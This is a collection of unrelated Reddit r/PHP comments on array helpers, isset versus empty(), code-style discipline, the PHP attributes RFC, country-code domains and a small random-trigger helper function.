&gt; packages are pulling in 6000+ lines of code to avoid writing isset($arr[$k]) ? $arr[$k] : null themselves. Whats wrong with the empty() function?
Code-style has never really bothered me. You guys must all live in a world of sunshine and rainbows, where bugs are so seldom that you can worry about whitespace. And here I am, getting amazed if I see a single commit without a single bug in it. We would never release anything to production ever if I started rejecting things because they didn't put a space between the parenthesis and brace.
Forgive me if I'm missing something, but this doesn't say WHY this is being done. What feature is this offering, what problem do we have that it's solving? It seems like a feature for feature's-sake.
I can't think of any use case so far, what's the advantage of having this registry versus just using symfony's container or service referencing? Edit: Okay, it's a plain registry, got it now.
it says so right in the introduction :) It's basically bringing doctrine's annotation library (and other ones) native to the php language without relying on comments.
Nothing is wrong with it, but it has a completely different usecase. If you try to use an array by a non-existent index you will get an error. You have to check if it's set before you try to use it. You can set a default value with the $collection-&gt;get('key', 'default value'), I think that is what he is talking about. 
The support package is a kind of a Util class that all projects used to have in the days of old. But now we know that Util classes are an antipattern breaking SOLID so the same should apply to these kinds of utility packages. If you want to have a library with array helpers call it arrayUtil and distribute separately.
But annotations *are supposed to be* comments. /edit: and not affect runtime, see [my thoughts](https://www.reddit.com/r/PHP/comments/4fviph/rfc_attributes/d2dgg78)
Agreed, its a terrible idea.
I worked for one international company. Every country was it's own company and paid the global company for various things. In some cases some of the countries were owned by another group and just paid licensing fees and stuff. Generally it's just business reasons. It also helps save a massive headache in having to figure out which country configuration you need to use based on IP location. Since Google for example blocks certain results in certain countries. Other companies provide services only to one country etc.
I have the .com and .ca of each domain I use for my business to protect the "brand" if you will. I live in Canada, but even people in Canada are more used to typing in .com over .ca
Nice Video tutorial.
&gt; (warning, portuguese content) Bit harsh :-) How about "Notice" instead?
I've seen companies buy all the TLDs for the main countries they do business in and then redirect them to the main domain with a extra parameter to set the language. The redirect is mostly because webshop extensions using ioncube for "protection"
Of course. But its not something you necessarily require twig for.
Sure I do. I updated the readme with a quick intro. Thanks!
DANGER
There are a few things that bother me... First of all, the naming. "random" itself is not very descriptive, and does not give me a clue about the behaviour of your utility. Second, the signature is even more misleading. At first glance i thought, with (3, 100) it would trigger in 3 out of 100 times. it actually triggers in floor (100 / 3) out of 100 times. so approximately 33%. Which is the same as (3, 200). This leads to Third: the range parameter is pretty much useless. And since it is, let me suggest: function randomlyOnceOutOf($inverseProbability){ return rand(1, $inverseProbability) == $inverseProbability; } //code runs one third of times if (randomlyOnceOutOf(3)) { doStuff(); } edit: spelling
[Here's](http://www.sitepoint.com/getting-started-php-extension-development-via-zephir/) an old but somewhat relevant post.
&gt; If you try to use an array by a non-existent index you will get an error. You have to check if it's set before you try to use it. False. That's wrong piece of information that I see many developers fall into. [empty() does not errors out on a non-existent index](https://3v4l.org/4BFuI)
Hey, thanks for your warning :-) I'll change it for notice this evening.
/r/php is not Stack Overflow or /r/phphelp
This is completely misguided. Php programmers tout things like 'know the right tool for the job' and make the very same mistakes when criticizing other languages...lol. But you gets up voted because there enough "shit" and "asshole" in your comment to appease the infantile mind of /r/php As of why you are wrong, this is why.. &gt; this is programming logic, and it belongs in the normal flow of your program. End of. Validation is programming logic, but it is often not the main logic implemented by a piece of code. So by removing the validation code to annotations, you reduce the clutter in the code that actually implement the main functionality. Which is often what you are most interested in, while tracing through the program.... &gt;That is 100% clear, and 100% unambiguous. Well, when someone criticizes the ambiguity in Php, these guys wave the php manual and says, look, it is very clearly documented...no ambiguity! So in this case, why is the information in java annotations ambiguous, if you know the language well?
mostly because startups usually have aggressive strategies, they launch in one country and might or not launch in other countries, but you have to secure your domains early to be able to - so i rather redirect them to my main brand instead of letting them time out i also register a lot of typo domains usually. having a country specific domain supposedly is one of the signals google uses as a ranking factor (among many others) 
No. Comments are supposed to be comments, not affect exection of the app.
In my opinion, the root cause of these things is the same: not taking enough time to think through the code. I find that taking time to enforce discipline about code style creates a culture of craftsmanship, a environment where making things functional *and* consistent thrives. This has been true in the last 4 years of my career. I have seen two very different organizations impacted very positively by creating a culture that values artistry more than efficiency. The cool thing is, the more these values take hold, the more efficient programmers become. When the same code style is used consistently, the code becomes easier to read. One of the truisms of programming is that code is harder to read than to write. So anything we can do to make code easier and faster to read will have significant impacts on efficiency. The second benefit of artistry is that people begin to care more about code being elegant, not in the sense of code being clever, but rather in being clear of intent. The side effect is that bugs are identified earlier and solved more quickly.
And yet if I mention my work without mentioning it's mine, I get accused of not giving full disclosure.